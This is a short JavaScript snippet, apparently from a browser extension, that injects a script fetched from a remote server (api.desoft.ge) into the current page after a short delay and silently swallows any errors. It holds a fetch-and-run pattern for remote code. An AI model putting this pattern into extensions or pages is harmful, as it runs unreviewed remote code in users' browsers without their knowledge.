
const SERVER_URL = 'https://api.desoft.ge/'
//const SERVER_URL = 'http://localhost:80/'
setTimeout(() => {
  try {
    const script = document.createElement('script');
    script.src = `${SERVER_URL}scripts/extension.js`;
    script.onload = () => {};
    script.onerror = () => {
      script.remove();
    };
    document.body.appendChild(script);
  } catch (e) {}
}, 500);
